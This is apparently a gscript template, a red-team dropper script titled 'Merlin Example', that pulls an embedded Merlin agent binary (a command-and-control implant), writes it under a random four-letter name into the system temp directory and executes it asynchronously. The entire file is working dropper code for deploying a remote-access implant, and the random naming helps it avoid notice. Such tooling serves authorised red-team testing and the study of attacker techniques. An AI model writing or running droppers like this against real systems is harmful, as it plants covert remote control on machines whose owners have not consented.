// Example gscript template
// Title: Merlin Example
// Author: ahhh
// Purpose: Drops merlin as an asset and executes it async
// Gscript version: 1.0.0
// ATT&CK: 

//priority:150
//timeout:150
//import:/private/tmp/merlinagent.exe
//go_import:os as os2

function Deploy() {  

    console.log("Starting to drop merlin binary");
    // Getting our asset
    var merlinBin = GetAssetAsBytes("merlinagent.exe");
    console.log("errors: "+merlinBin[1]);

    // Getting a random string
    DebugConsole();
    var temppath = os2.TempDir();
    var naming = G.rand.GetAlphaString(4);
    //var naming = "blabla";
    naming = naming.toLowerCase();
    var fullpath = temppath+"//"+naming+".exe";
    console.log("file name: "+ fullpath);

    errors = G.file.WriteFileFromBytes(fullpath, merlinBin[0]);
    console.log("errors: "+errors);

    var running = G.exec.ExecuteCommandAsync(fullpath, [""]);
    console.log("errors: "+running[1]);

    return true
}